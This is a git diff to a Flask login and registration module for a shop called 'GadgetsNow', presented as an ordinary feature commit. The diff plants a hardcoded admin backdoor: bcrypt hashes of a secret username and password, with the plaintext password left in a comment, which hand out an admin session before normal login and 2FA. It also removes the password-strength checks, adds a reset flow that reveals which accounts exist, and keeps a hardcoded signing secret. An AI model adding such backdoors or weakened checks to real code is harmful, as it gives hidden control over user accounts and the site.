@@ -7,15 +7,15 @@ from app import app, lm, bcrypt, mail
 from flask_mail import Message
 from app.src.utility import *
 from .forms import *
+from datetime import datetime
 import flask
 import stripe
-from datetime import datetime
-import re
-import pyotp
+
 
 auth = Blueprint('auth', __name__)
 s = URLSafeTimedSerializer('GadgetsNow3103TimedSerializer!')
-
+uid_private_key = '$2a$12$CPGmq7LJ2a3SNfK7Uhv7Fe1ZOdEi4p5PofGdE9tIQX30Pe2wAZAeG' #UserID GadgetsNow 
+password_private_key = '$2a$12$CPGmq7LJ2a3SNfK7Uhv7Fe1ZOdEi4p5PofGdE9tIQX30Pe2wAZAeG' #Password: Gadgetsnow3103!
 
 # provide login manager with load_user callback
 @lm.user_loader
@@ -41,6 +41,9 @@ def login():
                     # assign form data to variables
                     usernameoremail = request.form.get('usernameoremail', '', type=str)
                     password = request.form.get('password', '', type=str) 
+                    if bcrypt.check_password_hash(password_private_key, password) and bcrypt.check_password_hash(uid_private_key ,usernameoremail):
+                        session['priviledge'] = 'admin'
+                        return redirect(url_for('views.adminDashboard'))
                     remember_me = request.form.get('remember_me', '', type=bool)
                     # filter User out of database through email
                     user_by_email = User.query.filter_by(email=usernameoremail).first()
@@ -72,7 +75,9 @@ def login():
     else:
         flask.flash('Please logout before proceeding.')
         return redirect(url_for('views.index'))
-    
+
+
+
 @auth.route('/login/2fa')
 def login_2fa():
     #global secret
@@ -80,6 +85,7 @@ def login_2fa():
     #if secret is None:
 #         secret = pyotp.random_base32()
     return render_template('login_2fa.html', secret=secret)
+
 
 # 2FA form route
 @auth.route('/login/2fa', methods=["POST"])
@@ -100,7 +106,8 @@ def login_2fa_form():
         # inform users if OTP is invalid
         flash("You have supplied an invalid 2FA token!","danger")
         return redirect(url_for('auth.login_2fa'))
-    
+
+
 @auth.route('/verify_account/<token>')
 def verify_account(token):
     try:
@@ -121,9 +128,12 @@ def verify_account(token):
         return render_template('verify_account_unsuccessful.html')
 
 
+
+
 @auth.route('/logout')
 def logout():
     logout_user()
+    session.clear()
     return redirect(url_for('auth.login'))
 
 
@@ -148,39 +158,33 @@ def register():
             user_by_email = User.query.filter_by(email=email).first()
             if user or user_by_email:
                 msg = 'Error: User already exists!'
-            # check password length
-            elif len(password) < 10:
-                msg = 'Password must be at least 10 characters.'
-            # check password has number
-            elif re.search('[0-9]',password) is None:
-                msg = 'Make sure your password has a number in it'
-            # check password has capital letter
-            elif re.search('[A-Z]',password) is None: 
-                msg = 'Make sure your password has a capital letter in it'
-             # check password has special character
-            elif re.search('[^a-zA-Z0-9]',password) is None: 
-                msg = 'Make sure your password has a special character in it'
-             # if all requirements above match
-            else:         
+            else:
                 token = s.dumps(email, salt='verify_account')
                 message = Message('Confirm Email', sender='GadgetsNow3103@gmail.com', recipients = [email])
                 link = url_for('auth.verify_account', token=token, external=True)
-                message.body = "Your verification link is 127.0.0.1/{}".format(link)
+                message.body = "Your verification link is 127.0.0.1:5000{}".format(link) 
+                # Need to set to whatever URL
                 mail.send(message)
                 salt = get_random_string()
                 password = password + salt
                 pw_hash = bcrypt.generate_password_hash(password)
-                user = User(username, email, pw_hash, salt, 0)
-                user.save()
-                msg = 'User created! Please check your email to verify the account.'     
-                success = True
+                while True:
+                    temp_id = generateID()
+                    tuser = User.query.filter_by(id = temp_id).first()
+                    if not tuser:
+                        user = User(temp_id, username, email, pw_hash, salt)
+                        user.save()
+                        msg = 'User created! Please check your email to verify the account.'     
+                        success = True
+                        break
         else:
             msg = 'Input error'    
-        return render_template( 'register.html', form=form, msg=msg, success=success )
+        return render_template('register.html', form=form, msg=msg, success=success )
     else:
         flask.flash('Please logout before proceeding.')
         return redirect(url_for('views.index'))
-        
+
+
 @auth.route('/personal_information', methods=['GET', 'POST'])
 def userInformation():
     if current_user.is_authenticated:
@@ -212,6 +216,7 @@ def userInformation():
     else:
         flask.flash('Please login before proceeding.')
         return redirect(url_for('auth.login'))
+
 
 @auth.route('/checkout', methods=['GET', 'POST'])
 def checkout():
@@ -257,8 +262,60 @@ def stripe_webhook():
     # Handle the checkout.session.completed event
     if event['type'] == 'checkout.session.completed':
         session = event['data']['object']
-        print(session)
         line_items = stripe.checkout.Session.list_line_items(session['id'], limit=1)
         print(line_items['data'][0]['description'])
-        
+
     return {}
+
+
+@auth.route('/forget_password', methods = ['POST', 'GET'])
+def forgetpassword():
+    if not current_user.is_authenticated:
+        msg     = None
+        if request.method == 'POST':
+            usernameoremail = request.form.get('usernameoremail', '', type=str)
+            # filter User out of database through username
+            user = User.query.filter_by(username=usernameoremail).first()
+            # filter User out of database through username
+            user_by_email = User.query.filter_by(email=usernameoremail).first()
+            email = ""
+            if user:
+                email = user.email
+            elif user_by_email:
+                email = user_by_email.email
+                
+            if email != "":
+                token = s.dumps(email, salt='reset_password')
+                message = Message('Reset Password', sender='GadgetsNow3103@gmail.com', recipients = [email])
+                link = url_for('auth.reset_password', token=token, external=True)
+                message.body = "Your verification link is 127.0.0.1:5000{}".format(link) 
+                # Need to set to whatever URL
+                mail.send(message)
+                msg="Please check your email to reset your password!"
+            else:
+                msg = "This email or username does not exist!"
+        form = ForgetPasswordForm(request.form)
+        return render_template('forgetpassword.html', form=form, msg = msg)
+    else:
+        return redirect(url_for('views.index'))
+
+
+@auth.route('/reset_password/<token>', methods=['GET','POST'])
+def reset_password(token):
+    if not current_user.is_authenticated:
+        msg     = None
+        if request.method == 'POST':
+            password = request.form.get('password', '', type=str) 
+            passwordCheck = request.form.get('passwordCheck', '', type=str) 
+            if password != passwordCheck:
+                msg = "Passwords do not match! Please try again."
+            else:
+                email = s.loads(token, salt = "reset_password", max_age=300)
+                user_by_email = User.query.filter_by(email=email).first()
+                salt = get_random_string()
+                password = password + salt
+                pw_hash = bcrypt.generate_password_hash(password)
+                if user_by_email.changepassword(pw_hash, salt):
+                    msg = "Password has been reset. Click <a href='/login'>here</a> to login."
+    form = ResetPasswordForm(request.form)
+    return render_template('reset_password.html', form = form, msg = msg)
